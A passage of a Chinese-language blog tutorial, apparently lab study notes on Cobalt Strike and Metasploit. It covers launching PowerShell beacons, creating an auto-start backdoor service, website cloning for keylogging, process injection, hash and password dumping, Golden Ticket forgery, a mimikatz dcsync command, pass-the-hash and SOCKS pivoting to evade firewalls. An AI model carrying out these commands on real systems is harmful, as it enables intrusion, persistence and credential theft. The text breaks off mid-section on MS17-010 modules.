+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Import-Module .\payload<span class="hljs-selector-class">.ps1</span>      作用：将 payload<span class="hljs-selector-class">.ps1</span> 文件作为一个 PowerShell 模块 导入。<br>或<br>. .\payload<span class="hljs-selector-class">.ps1</span>                  作用：直接执行 payload<span class="hljs-selector-class">.ps1</span> 文件中的代码，并将其中的内容加载到当前作用域。<br><br><br><br>第一个 . 是 Dot Sourcing 的符号，表示将脚本的内容加载到当前作用域。<br>第二个 .\ 指向当前目录中的脚本文件。<span class="hljs-selector-attr">[在powershell中.\才是指当前目录下的文件  而./是linux的shell中常用的表示这个意义的符号]</span><br><br></code></pre></td></tr></table></figure>
+
+<p>在cmd下：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">powershell <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\payload.ps1<br>或<br>powershell .\payload.ps1<br></code></pre></td></tr></table></figure>
+
+<h5 id="Powershell-Command"><a href="#Powershell-Command" class="headerlink" title="Powershell Command:"></a>Powershell Command:</h5><p>直接把生成的命令粘贴到powershell中执行即可上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221819589.png" srcset="/img/loading.gif" lazyload alt="image-20241122181916443"></p>
+<p> <strong>PowerShell 脚本（Payload）</strong> 还是 <strong>PowerShell Command（Payload）</strong>，<strong>一旦关闭 PowerShell 会话，所有在内存中的状态、变量和临时创建的对象都会被清除</strong>。但是，如果脚本或命令执行了持久化操作（如写入文件、注册表项或启动持久化进程），这些影响会在会话结束后依然存在。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411271113430.png" srcset="/img/loading.gif" lazyload alt="image-20241127111328659"></p>
+<p>其中的raw所生成的可执行文件是bin文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411271756983.png" srcset="/img/loading.gif" lazyload alt="image-20241127175647808"></p>
+<h4 id="Windows可执行程序-E-Windows可执行程序-Stageless）的区别"><a href="#Windows可执行程序-E-Windows可执行程序-Stageless）的区别" class="headerlink" title="Windows可执行程序(E)&amp;&amp;Windows可执行程序(Stageless）的区别"></a>Windows可执行程序(E)&amp;&amp;Windows可执行程序(Stageless）的区别</h4><p>  这两个模块直接用于生成可执行的exe 文件或dll 文件。Windows Executable是生成Stager类型的马，而<br>Windows Executable(S)是生成Stageless类型的马。那stager和stageless有啥区别呢？</p>
+<ul>
+<li><p>Stager是分阶段传送PayloaI 分阶段啥意思呢?就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。</p>
+</li>
+<li><p>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。<strong>但是这种木马有助于避免反溯源</strong>，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在Cobaltstrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的stageless类型的木马。</p>
+</li>
+<li><p>Windowss Executable(S)相比于Windows Executable，其中包含Beacon的完整pavload，不需要阶段性的请求</p>
+<p>该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将</p>
+<p>StagelessPayload注入内存</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th align="left"><strong>Windows 可执行程序 (E)</strong></th>
+<th><strong>Windows 可执行程序 (Stageless)</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>负载阶段</strong></td>
+<td align="left">分阶段（Loader[指加载器] 和主负载）首先把Loader传到目标主机 然后依赖Loader加载位于C2服务器上的主负载</td>
+<td>单阶段（完整负载）直接完整的主负载直接嵌入到生成的可执行文件中，无需依赖额外的下载过程</td>
+</tr>
+<tr>
+<td><strong>网络依赖</strong></td>
+<td align="left">必须与 C2 服务器通信[要从C2服务器上下载主负载]</td>
+<td>无需网络连接即可运行单次上传成功即可</td>
+</tr>
+<tr>
+<td><strong>文件大小</strong></td>
+<td align="left">通常较小第一次攻击者主动上传的文件[Loader]较小</td>
+<td>通常较大[攻击者直接上传含有主负载的可执行文件]</td>
+</tr>
+<tr>
+<td><strong>执行速度</strong></td>
+<td align="left">依赖网络环境[因为目标主机要从C2服务器上下载主负载]</td>
+<td>更快[只需单次上传无网络延迟]</td>
+</tr>
+<tr>
+<td><strong>检测难度</strong></td>
+<td align="left">初始文件难检测，<strong>行为易检测</strong>                                                                                             但是比较容易更新，可以通过改变C2服务器上的主负载来执行不同的任务 动态加载主负载，便于调整和更新 常用于持久化植入或大规模网络环 境</td>
+<td><strong>静态文件易检测</strong>，无网络行为                                       只适合特定目标的单次攻击[一次性攻击]</td>
+</tr>
+<tr>
+<td><strong>适用环境</strong></td>
+<td align="left">网络连接良好</td>
+<td>无网络连接或需快速执行</td>
+</tr>
+</tbody></table>
+<h5 id="对于其中的Windows-Service-EXE"><a href="#对于其中的Windows-Service-EXE" class="headerlink" title="对于其中的Windows Service EXE"></a>对于其中的Windows Service EXE</h5><p>它生成的木马直接双击执行是无法返回session的，需要以创建服务的方式启动才会返回session</p>
+<p>注：要先创建服务然后启动服务 只有启动服务后目标主机才能上线    而且这种操作**<u>需要管理员权限</u>**才能够执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#注意，等号后面要有空格</span><br><span class="hljs-built_in">sc</span> create autoRunBackDoor binPath= <span class="hljs-string">&quot;cmd,exe /c C:\users\win7\desktopcs.exe&quot;</span> <span class="hljs-built_in">start</span>= auto DispTayName=autoRunBackDoor<br><br><span class="hljs-comment">#第一个autoRunBackDoor是服务的内部名称（ServiceName），你用它来在命令行或脚本中管理服务。</span><br><span class="hljs-comment">#第二个autoRunBackDoor是DisplayName，这是你在 Windows 服务管理工具中看到的名称，用于管理员识别服务。</span><br><br><span class="hljs-comment">#开启某个系统服务</span><br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> autoRunBackDoor<br><span class="hljs-comment">#停止某个系统服务</span><br><span class="hljs-built_in">sc</span> stop autoRunBackDoor<br><span class="hljs-comment">#删除某个系统服务</span><br><span class="hljs-built_in">sc</span> delete servicename<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282147356.png" srcset="/img/loading.gif" lazyload alt="image-20241128214736109"></p>
+<h4 id="创建Attacks（钓鱼攻击）"><a href="#创建Attacks（钓鱼攻击）" class="headerlink" title="创建Attacks（钓鱼攻击）"></a>创建Attacks（钓鱼攻击）</h4><ul>
+<li><p><strong>克隆网站</strong>	可以记录受害者提交的数据;</p>
+</li>
+<li><p><strong>文件下载</strong>	提供一个本地文件下载，可以修改Mime信息。</p>
+</li>
+<li><p><strong>Scripted Web Delivery(S)</strong>	基于Web的攻击测试脚本，自动生成可执行的payload，通常用这个模块来生</p>
+<p>成powershell命令反弹shell	</p>
+</li>
+<li><p><strong>签名Applet攻击</strong>	启动一个Web服务以提供自签名lava Applet的运行环境</p>
+</li>
+<li><p><strong>智能攻击</strong>	自动检测java版本并利用已知的exploits绕过security;</p>
+</li>
+<li><p><strong>信息搜集</strong>	用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</p>
+</li>
+</ul>
+<h4 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h4><p>使用该模块来克隆下一个网站然后获取用户的键盘记录<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282213334.png" srcset="/img/loading.gif" lazyload alt="image-20241128221338247"></p>
+<p>将你想要克隆的网站填进去然后可以勾选一下然后会给你一个url样子就是你所克隆的网站</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282215105.png" srcset="/img/loading.gif" lazyload alt="image-20241128221551843"></p>
+<p>然后在视图中的web日志中即可看到一些相关的操作日志</p>
+<h1 id="三、CS对被控主机的操作"><a href="#三、CS对被控主机的操作" class="headerlink" title="三、CS对被控主机的操作"></a>三、CS对被控主机的操作</h1><h2 id="View（视图）"><a href="#View（视图）" class="headerlink" title="View（视图）"></a>View（视图）</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041118860.png" srcset="/img/loading.gif" lazyload alt="image-20250204111821746"></p>
+<p>图片中便是一些我们可以查看的一些信息解释如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041119326.png" srcset="/img/loading.gif" lazyload alt="image-20250204111932270"></p>
+<h3 id="一些简单基础的操作须知"><a href="#一些简单基础的操作须知" class="headerlink" title="一些简单基础的操作须知"></a>一些简单基础的操作须知</h3><p>会话交互操作：<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041549607.png" srcset="/img/loading.gif" lazyload alt="image-20250204154946465"></p>
+<p>在执行常规的系统指令的时候需要先在命令前加上shell 例如：shell ipconfig</p>
+<p>为了攻击行为的隐蔽性cs默认交互间隔时间为1min自己在进行测试的时候可以手动把回连间隔调小一点</p>
+<p>在进行文件浏览操作的时候如果不进行任何其他操作所看到的文件夹只能是木马程序所在的根目录下（根盘符）的所有文件</p>
+<p>在查看屏幕截图的时候操作如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041655111.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-04 165212"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041655579.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-04 165227"></p>
+<p>注意在进行屏幕截图的时候只是针对普通用户（因为普通用户才有正常的操作界面system用户是没有的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041801175.png" srcset="/img/loading.gif" lazyload alt="image-20250204180158965"></p>
+<p>提权大都是利用漏洞来进行的所以如果目标主机不存在这个漏洞提权操作是肯定不成功的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041803656.png" srcset="/img/loading.gif" lazyload alt="image-20250204180349563"></p>
+<h2 id="抓取hash和dump明文密码"><a href="#抓取hash和dump明文密码" class="headerlink" title="抓取hash和dump明文密码"></a>抓取hash和dump明文密码</h2><p>执行这两个操作一般都有需要有管理员权限需要提权</p>
+<p>有了这两个东西后比较方便后续例如横向移动等等的操作</p>
+<p>抓取Hash值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051338507.png" srcset="/img/loading.gif" lazyload alt="image-20250205133832376"></p>
+<p>获取明文密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051339686.png" srcset="/img/loading.gif" lazyload alt="image-20250205133943605"></p>
+<p>提取成功后我们可以查看获取到的凭证信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051340342.png" srcset="/img/loading.gif" lazyload alt="image-20250205134004255"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041828533.png" srcset="/img/loading.gif" lazyload alt="image-20250204182852435"></p>
+<p>可以自己去网上找一些提权脚本（注意对应的脚本要适用于当前的测试环境不然肯定提权失败）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041830218.png" srcset="/img/loading.gif" lazyload alt="image-20250204183043169"></p>
+<h2 id="控主机建立Socks4代理"><a href="#控主机建立Socks4代理" class="headerlink" title="控主机建立Socks4代理"></a>控主机建立Socks4代理</h2><p>当我们控制的主机是一台位于公网和内网边界的服务器，我们想利用该主机继续对内网进行渗透，于是，我们可<br>以利用CS建立socks4A代理。</p>
+<h3 id="1-内网访问控制的绕过"><a href="#1-内网访问控制的绕过" class="headerlink" title="1. 内网访问控制的绕过"></a>1. <strong>内网访问控制的绕过</strong></h3><ul>
+<li><strong>内网隔离</strong>：通常，内网与外网之间通过防火墙、路由器、NAT（网络地址转换）等设备进行隔离，限制外部访问内网。通过在外网中找到一个具有公网 IP 的服务器（通常是 DMZ 区域的主机），你可以在公网和内网之间建立一个 <strong>中转站</strong>，绕过内网的访问控制。</li>
+<li><strong>NAT 和防火墙绕过</strong>：内网的设备通常通过 NAT 或防火墙与外界进行通信，而外部设备无法直接访问内网的主机。SOCKS4A 代理使得攻击者能够通过已经控制的边界主机访问内网资源，而无需直接暴露内网主机。</li>
+</ul>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">DMZ</span> 区域的主机指的是部署在内网与外网之间的服务器，这些主机通常负责公开服务。通过 DMZ，外部用户可以访问公开的服务（如 Web 服务器、邮件服务器），但这些服务与内网资源隔离，减少了内网直接暴露在外部的风险。DMZ 是 多层防御 的一部分，能有效提升网络安全性，保护内网免受外部攻击。<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-利用-CS-构建-SOCKS4A-代理"><a href="#2-利用-CS-构建-SOCKS4A-代理" class="headerlink" title="2. 利用 CS 构建 SOCKS4A 代理"></a>2. <strong>利用 CS 构建 SOCKS4A 代理</strong></h3><ul>
+<li><strong>Cobalt Strike（CS）</strong> 是一个常用于渗透测试和红队活动的工具，它提供了 <code>SOCKS4A</code> 代理功能，允许用户通过被控制的主机将网络流量转发到目标内网。</li>
+<li><strong>SOCKS4A</strong> 是 SOCKS 协议的一种变体，它支持通过代理服务器将目标主机的 IP 地址和端口隐匿，适用于绕过防火墙和 NAT。SOCKS4A 代理不仅可以将流量转发，还允许在目标主机中建立与其他内网主机的连接，这对于攻击者非常有用。</li>
+</ul>
+<h3 id="3-隐蔽性"><a href="#3-隐蔽性" class="headerlink" title="3. 隐蔽性"></a>3. <strong>隐蔽性</strong></h3><ul>
+<li>通过 SOCKS4A 代理，攻击者的网络流量看起来像是从已控制的中转主机发出的，而不是直接从外部发出。这样可以隐藏攻击者的真实来源，增加攻击的隐蔽性。</li>
+<li>通过 SOCKS4A 代理，所有的内部访问都通过受信任的边界主机，这可以避开内网防火墙、IDS（入侵检测系统）和 IPS（入侵防御系统）的警报。</li>
+</ul>
+<h2 id="进程列表-注入进程，键盘监控"><a href="#进程列表-注入进程，键盘监控" class="headerlink" title="进程列表(注入进程，键盘监控)"></a>进程列表(注入进程，键盘监控)</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041841672.png" srcset="/img/loading.gif" lazyload alt="image-20250204184159581"></p>
+<p>在进行进程注入的时候建议注入的进程号比木马程序的进程号大（成功率高）</p>
+<p>原因：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">选择 较大 PID 的进程 作为注入目标的原因，主要是基于以下几点：<br>1较新的进程通常更容易被操作系统和安全工具接受，因为它们的内存布局较为独立，且没有被其他进程占用。<br>2较小的 PID 通常对应于系统级进程，这些进程受保护机制和安全工具的监控较多，注入成功的难度更高。<br>3选择较大 PID 的进程可以避免与其他已运行进程的内存冲突，降低注入失败的概率。<br>因此，为了提高进程注入的 成功率，选择注入较大 PID 的进程是一种较为常见的策略。<br></code></pre></td></tr></table></figure>
+
+<p>操作如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041854185.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-04 185308"></p>
+<p>可以发现回来了一个会话 如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041855111.png" srcset="/img/loading.gif" lazyload></p>
+<p>（注意：在进行权限注入的时候首选低权限运行的程序进程进行注入这样注入成功率比较高）</p>
+<p>选中该进程，Kill为杀死该进程，Refresh为刷新该进程，Inject 则是把beacon注入进程，Log Keystrokes为键盘记录，screenshot 为截图，stea Token为窃取运行指定程序的用户令牌</p>
+<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>任意选择一个进程，点击Log Keystrokes键，即可监听该主机的键盘记录</p>
+<p>操作如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015300.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-04 201104"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015958.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-04 201137"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015642.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-04 201151"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042017957.png" srcset="/img/loading.gif" lazyload alt="image-20250204201746883">如上图可得到键盘输入的记录；</p>
+<h2 id="生成黄金票据注入当前会话（Golden-Ticket）"><a href="#生成黄金票据注入当前会话（Golden-Ticket）" class="headerlink" title="生成黄金票据注入当前会话（Golden Ticket）"></a>生成黄金票据注入当前会话（<strong>Golden Ticket</strong>）</h2><p>生成黄金票据的前提是我们已经获得krbtgt用户的哈希并且已经获一个以域用户登录的主机权限</p>
+<p>（<u>krbtgt 账户是一个专门用于 Kerberos 身份验证的账户。它的哈希值用于加密和生成 Kerberos 票证（TGT）。如果攻击者获取到该哈希值，可能会导致严重的安全风险，例如 <strong>Golden Ticket</strong> 攻击。</u>）</p>
+<p>注：krbtgt用户是默认存在的不需要再额外去配置</p>
+<p>【由于现阶段我的学习进度还不知道如何横向移动到域控上执行命令获取krbtgt用户的一些相关信息所以我直接选择去到我的域控的虚拟机上跑<a target="_blank" rel="noopener" href="https://github.com/ParrotSec/mimikatz">mimikatz</a>来获取krbtgt 账户的一些信息（**<code>mimikatz</code>**可以从内存中提取明文密码、哈希、PIN 码和 Kerberos 票证。）】</p>
+<p>操作如图：</p>
+<p>首先查看这个域控上存在krbtgt这个用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082115649.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-08 190716"></p>
+<p>然后运行mimikatz（相关的一些命令在下图中可以看到   以mimikatz开头的#后的就是要用到的命令）注：使用这个工具获取krbtgt用户的信息需要以管理员的权限运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082116453.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-08 190738"></p>
+<p>然后结果会存放到这个exe同级目录下的mimikatz文档中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082121928.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-08 190756"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082121964.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-08 190805"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082108577.png" srcset="/img/loading.gif" lazyload alt="image-20250208210815312"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051619929.png" srcset="/img/loading.gif" lazyload alt="image-20250205161909875"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051619047.png" srcset="/img/loading.gif" lazyload alt="image-20250205161916005"></p>
+<p>其中的</p>
+<p>User：是我们要伪造的用户名一般我们填administrator</p>
+<p>Domain：域名</p>
+<p>Domain SID：域SID</p>
+<p>krbtgr Hash：krbtgt用户的hash</p>
+<p>在相关的信息输入完成后点击build然后显示注入成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082125252.png" srcset="/img/loading.gif" lazyload alt="image-20250208212517163"></p>
+<p>然后通过命令：<code>dir \\dc\c$ </code>用于列出名为 <code>dc</code> 的远程计算机上的 <code>C:</code> 驱动器的内容（也就是在同一个域的其他的计算机中的c盘里的东西——横向移动）通过伪造的黄金票据实现</p>
+<p>注意使用这条命令的时候<strong>前提</strong>是远程计算机必须<strong>处于开机状态</strong>且你正在使用的这台主机和远程计算机之间网络可达才行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502091050307.png" srcset="/img/loading.gif" lazyload alt="image-20250209104959184"></p>
+<h3 id="问题解决："><a href="#问题解决：" class="headerlink" title="问题解决："></a>问题解决：</h3><p>对于这条命令的成功执行我个人遇到点阻力，老是报错说拒绝访问首先我查看了一下域控的文件共享设置然后全部开启如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502091053201.png" srcset="/img/loading.gif" lazyload alt="image-20250209105327138"></p>
+<p>然后问题并没有解决还是拒绝访问然后我尝试使用命令<strong>shell klist purge</strong>来清除缓存的黄金票据又重新生成了一份然后就成功解决了。</p>
+<p><strong>获取域中其他主机名的方法：net view</strong></p>
+<p><code>net view</code>查看当前<strong>域内主机</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051654469.png" srcset="/img/loading.gif" lazyload alt="image-20250205165422398"></p>
+<p>查看当前用户缓存的票据：shell klist</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082126934.png" srcset="/img/loading.gif" lazyload alt="image-20250208212647855"></p>
+<p>然后可以使用命令<code>mimikatz lsadump::dcsync /domain:ad.com /all /csv</code>导出域内所有用户的哈希了（注意空格）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111332584.png" srcset="/img/loading.gif" lazyload alt="image-20250211133222402"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>操作如图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111338642.png" srcset="/img/loading.gif" lazyload alt="image-20250211133835544"></p>
+<p>其中的最大线程数我们一般是选择200</p>
+<p><strong>ARP</strong>：使用地址解析协议来发现同一局域网内的活跃设备。</p>
+<p><strong>ICMP</strong>：通过发送 Ping 请求测试目标主机是否可达。</p>
+<p><strong>None</strong>：不进行任何主机发现，直接扫描指定的地址和端口。</p>
+<p>以上不同的选项对应不同的主机发现方法 如果选none的话（不进行主机探活）就默认所有主机都是存活状态</p>
+<p>扫描结果会直接输出在控制台如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111403565.png" srcset="/img/loading.gif" lazyload alt="image-20250211140344453"></p>
+<p>或者选择一种更为直接的方法 点击视图一&gt;目标，就会出现网段中存活的主机。(这是通过端口扫描下测到的结果显示的，要想这里显示必须得先进行扫描端口或者手动添加)<br><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111408402.png" srcset="/img/loading.gif" lazyload alt="image-20250211140859238"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111410949.png" srcset="/img/loading.gif" lazyload alt="image-20250211141022884"></p>
+<p>然后如果有类似任务我们想要停掉它可以先使用命令<code>jobs</code>列出任务然后使用<code>jobkill [JID]</code>即可</p>
+<p>操作如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111353588.png" srcset="/img/loading.gif" lazyload alt="image-20250211135353522"></p>
+<h2 id="Hash传递攻击或ssh远程登录"><a href="#Hash传递攻击或ssh远程登录" class="headerlink" title="Hash传递攻击或ssh远程登录"></a>Hash传递攻击或ssh远程登录</h2><p>在进行上一步的端口扫描发现主机后我们可以利用hash传递攻击和ssh远程登录来进行横向移动</p>
+<p>如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111452708.png" srcset="/img/loading.gif" lazyload alt="image-20250211145212609"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111452529.png" srcset="/img/loading.gif" lazyload alt="image-20250211145240470"></p>
+<p>点击Launch后如图返回shell成功（以下第二张照片中的白色的那一行就是成功返回来的shell）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111504867.png" srcset="/img/loading.gif" lazyload alt="image-20250211150403749"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111504155.png" srcset="/img/loading.gif" lazyload alt="image-20250211150412071"></p>
+<h1 id="四、MSF和CS联动"><a href="#四、MSF和CS联动" class="headerlink" title="四、MSF和CS联动"></a>四、MSF和CS联动</h1><p>实际上就是一个流量的转发 </p>
+<p><strong>注意一点</strong>：在实际攻击中cs的服务器肯定是在一台公网上的服务器上我建议无论啥时候要联动的话直接把msf和c2服务器放在一台服务器上 这样一方面不用再去专门的配置端口转发还有防火墙的策略另一方面shell流量转来转去可能导致连接不是很稳定</p>
+<p>同时建议使用http或者https来建立回连的会话通过网关以及防火墙的概率比较高。</p>
+<p>注：http对应http，，https对应https 啥意思呢 如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162012236.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-16 200549"></p>
+<p>地址填C2的地址 端口对应上msf上的端口就行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162012679.png" srcset="/img/loading.gif" lazyload alt="image-20250216201222625"></p>
+<p>针对最下面的两个Foreign是用来与外部应用来进行联动的（流量转发） </p>
+<p>步骤：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">1.<span class="hljs-keyword">cs</span>配置外部监听器 <br>2.到c2所在的服务器上使用命令msfconsole<br>	<span class="hljs-keyword">use</span> exploit/multi/handler<br>	<span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http （注意区分http还是https）<br>	<span class="hljs-keyword">set</span> lhost <span class="hljs-keyword">CS</span>的服务器地址<br>	<span class="hljs-keyword">set</span> lport <span class="hljs-keyword">CS</span>外联监听器的端口(此处应为4441)<br>	<span class="hljs-keyword">run</span><br>3.<span class="hljs-keyword">cs</span>指定会话里运行spawn 外联监听器名<br></code></pre></td></tr></table></figure>
+
+<p>如图：[当出现红色方框中的东西时表示已经回连成功 绿色方框里是命令]</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162140024.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-02-16 213630"></p>
+<p>退出输入exit即可</p>
+<h1 id="五、MSF复制会话到CS"><a href="#五、MSF复制会话到CS" class="headerlink" title="五、MSF复制会话到CS"></a>五、MSF复制会话到CS</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">首先针对我所遇到的一系列问题进行总结这次实验环境我使用的通过永恒之蓝来实现对win7主机的操控</span><br><span class="hljs-string">先来说说msf中的几个脚本的区别（当我们search</span> <span class="hljs-string">ms17-010后我们会先查找到多个漏洞脚本）</span><br>   <span class="hljs-comment">#   Name                                           Disclosure Date  Rank     Check  Description</span><br>   <span class="hljs-bullet">-</span>   <span class="hljs-string">----</span>                                           <span 